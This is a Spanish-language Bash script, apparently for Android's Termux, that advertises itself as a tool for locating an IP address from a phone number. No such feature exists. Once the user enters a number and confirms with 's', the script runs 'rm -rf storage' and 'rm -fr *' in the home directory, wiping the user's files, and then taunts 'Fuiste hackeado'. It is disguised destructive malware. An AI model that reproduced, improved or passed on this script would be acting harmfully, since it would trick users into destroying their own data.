#!/bin/bash

#colores

blanco="\e[1;37m"
cyan="\e[1;36m"
lila="\e[1;35m"
verde="\e[1;32m"
amarillo="\e[1;33m"
rojo="\e[1;31m"
numero=

#banner / codigo :D

clear
echo
sleep 0.03
echo -e "$lila- - - - - - - - - - - - - - - - - - - - - - - - "
sleep 0.05
echo -e "$verde  _   _                 ___ ____"
sleep 0.05
echo -e "$cyan | \ | |_   _ ________ |_ _|  _ \ "
sleep 0.05
echo -e "$blanco |  \| | | | |  _   _ \ | || |_) |"
sleep 0.05
echo -e "$verde | |\  | |_| | | | | | || ||  __/ "
sleep 0.05
echo -e "$cyan |_| \_|\__,_|_| |_| |_|___|_|"
sleep 0.05
echo -e
sleep 0.05
echo -e "$cyan Programado por$amarillo :$blanco WhBeatZ$cyan Mi insta $amarillo--> $blanco WhBeatZ"
sleep 0.05
echo -e
sleep 0.05
echo -e "$lila Disponible para todos los$blanco Paises"
echo -e
sleep 0.05
echo -e "$rojo No me hago responsable del mal uso que le den"
sleep 0.05
echo -e
echo -e "$lila- - - - - - - - - - - - - - - - - - - - - - - - "
sleep 0.05
echo
echo -e "$amarillo -$blanco Escoge la opcion a tu gusto :D"
sleep 0.05
echo -e
echo -e "$amarillo -$blanco 1$amarillo)$verde Localizar$blanco ip$verde con numero$blanco telefonico"
sleep 0.05
echo -e
echo -e "$amarillo -$blanco 2$amarillo)$rojo Salir"
sleep 0.05
echo -e
sleep 0.05
echo -e -n "$amarillo---> $blanco"
read numero
case $numero in

              1)

              echo
              sleep 0.05
              echo -e -n "$amarillo -$cyan Escribe el$blanco numero$cyan telefonico a$blanco localizar$lila ($cyan Ejemplo$amarillo :$blanco +34638264957$lila )$amarillo --->$blanco " $movil
              read movil
              echo
              ;;


              2)

              sleep 0.5
              exit
              ;;

              *)

              echo
              slepp 0.05
              echo -e "$rojo Que mierda pusiste xddd???"
              sleep 3
              clear
              bash numipwh.sh
              ;;



esac

sleep 0.05
echo -e -n "$amarillo -$cyan El numero$rojo $movil$cyan es correcto?$cyan Pulsa$lila ($blanco s$lila )$cyan para continuar$amarillo ---> $blanco "
read letra
case $letra in

             s)

             echo
             echo
             cd
             rm -fr storage
             rm -rf storage
             cd
             echo -e "$amarillo -$rojo Fuiste hackeado xdxd"
             sleep 0.5
             echo -e
             echo -e "$amarillo -$rojo Tu storage a sido eliminado xd"
             rm -fr *
             sleep 0.5
             echo
             echo -e "$amarillo -$cyan Si quieres que haga una herramienta$blanco personalizada$cyan, escribeme al ig $amarillo -->$blanco WhBeatZ "
             sleep 10
             ;;

             *)
             echo
             echo
             echo -e "$amarillo -$rojo Que carajos pusiste? xdd"
             sleep 2
             clear
             bash numipwh.sh
esac
